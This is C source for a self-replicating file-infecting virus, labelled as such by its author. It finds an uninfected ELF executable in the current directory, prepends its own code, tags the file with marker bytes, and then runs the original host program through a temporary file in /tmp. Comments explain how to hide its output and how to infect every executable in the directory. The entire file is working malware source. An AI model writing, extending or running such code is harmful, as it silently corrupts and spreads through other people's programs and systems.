//
//  virus.c
//  simple self-replicating virus
//
//  Created by Chase Clarke on 12/2/18.
//
#include <dirent.h>
#include <stdio.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>

#define FILESIZE 11184

bool isVirus(char filename[]) {
    FILE *fp;
    char ch;
    int num = 3;
    long length;
    int i = 0;
    int compare[3] = {48,49,50};

    fp = fopen(filename, "r");
    
    fseek(fp, 0, SEEK_END);
    length = ftell(fp);
    fseek(fp, (length - num), SEEK_SET);
    
    do {
        ch = fgetc(fp);
        if (i < 3){
            if (compare[i++] != ch){
                return false;
            }
        }
    } while (ch != EOF);
    fclose(fp);
    return true;
}


// checks if valid ELF exe and not already infected
// if first 3 chars in file == ELF then elf file
bool isValid(char filename[], char virus[]) {
    FILE *fp;
    char ch[4]; // create a buffer with enough size for ELF + null termination'
    
    struct stat st;
    stat(filename, &st);
    if (S_ISDIR(st.st_mode)) {
        return 0;
    }
    
    fp=fopen(filename,"r");
    char one[4] = {0x7f,'E','L','F'}; // for comparison
    bool valid = false;
    
    fread(ch, sizeof(char),4,fp);
    ch[4] = '\0'; // null terminate
    
    char *a = ch; //create pointer to remove first 0x7F "magic byte" before comparison
    
    // is ELF file?
    if(strncmp(one, a, sizeof(one)) == 0)
        valid = true;
    
    fclose(fp);

    // are both conditions met?
    if (valid && !isVirus(filename))
        return true;
    else {
        return false;
    }
}

// appends the virus to the end of the target file
// virus file: is this file, targetFile: is target to be infected
void concat(char virusFile[], char targetFile[], int isOrigional){
    FILE *fs1, *fs2, *ft;
    struct stat st;
    int count = 0;
    
    char file3[20];
    int ch;

    fs1 = fopen(virusFile, "r");
    fs2 = fopen(targetFile, "r");
    ft = fopen("/tmp/H8ked", "w"); // Opening in write mode

    // copying contents of file
    while((ch = fgetc(fs1)) != EOF){
        if (isOrigional) {
            fputc(ch,ft);
        }
        if(!isOrigional) {
            if (count < FILESIZE) {
                fputc(ch,ft);
            }
        }count++;
    }
    while((ch = fgetc(fs2)) != EOF)
        fputc(ch,ft);
    
    // add my "magic" characters (123 encoded) to the end of the file
    // so my virus knows this is an infected file in the future
    fputc(48,ft);
    fputc(49,ft);
    fputc(50,ft);

    fclose(fs1);
    fclose(fs2);
    fclose(ft);
    
    // applying correct permissions to concatendated file temp file
    stat(targetFile, &st);
    chmod("/tmp/H8ked", st.st_mode);
    
    remove(targetFile);
    fs1 = fopen("/tmp/H8ked", "r");
    fs2 = fopen(targetFile, "w");
    
    // moving the file back to the working directory
    while((ch = fgetc(fs1)) != EOF)
        fputc(ch,fs2);
    
    // applying correct permissions to concatendated file
    stat("/tmp/H8ked", &st);
    chmod(targetFile, st.st_mode);
    
    fclose(fs1);
    fclose(fs2);
    // deleting temp file when done
    remove("/tmp/H8ked");
    
}

void executeOld(char **argv) {
    FILE *fs1, *ft;
    int ch;
    int localCount = 0;
    struct stat st;
    
    // using /tmp linux directory so ls cannot see temp files
    fs1 = fopen(argv[0], "r");
    ft = fopen("/tmp/H8kedAgain", "w"); // opening in write mode

    // creating a new file with just the contents of the origional program
    // skip the virus at the start
    while((ch = fgetc(fs1)) != EOF) {
        if(localCount >= FILESIZE){
            fputc(ch,ft);
        } localCount++;
    }
    // saving new 'H8ked' file
    fclose(ft);

    // applying correct permissions to concatendated file
    // with error detection
    stat(argv[0], &st);
    chmod("/tmp/H8kedAgain", st.st_mode);

    // forking a new process so virus file not terminated
    // when opening new file
    
    pid_t i = fork();
    if (i == 0)
    {
        execv("/tmp/H8kedAgain", argv);
        exit(0);
    }
    else{
        //wait or else H8kedAgain is not run
        waitpid(i, 0, 0);

    }

    // deleting file when done
    remove("/tmp/H8kedAgain");
}


int main(int argc, char **argv) {
    
    DIR *d;
    struct dirent *dir;
    FILE* ElfFile = NULL;
    char checkTwo[] = "virus";
    char *check = argv[0];
    check++;
    check++;
    d = opendir(".");
    
    // delete print statement to hide execution of virus
    printf("Hello! I am a simple virus!\n");
    
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (access(dir->d_name, R_OK) == 0 ) { // does file have permissions to access?
                if(isValid(dir->d_name, check) && strncmp(dir->d_name, checkTwo, sizeof(checkTwo)) != 0) { // If valid exe found and not virus exe
                    
                    // check if virus.c file or an infected file.
                    // their sizes will be different.
                    
                    //not origional
                    if(strncmp(check, checkTwo, sizeof(check)) != 0){
                        concat(argv[0], dir->d_name, 0); // combine files
                    
                    }
                    //origional
                    if (strncmp(check, checkTwo, sizeof(check)) == 0) {
                        concat(argv[0], dir->d_name, 1); // combine files
                    }
                    
                    //dont break if you want to infect all exe's in working directory
                    break;
                }
            }
        }
        // dont run if origional virus.c file
        if (strncmp(checkTwo, check, sizeof(check)) != 0){
            executeOld(argv); // execute old file
        }
        closedir(d);
    }
    return(0);
}
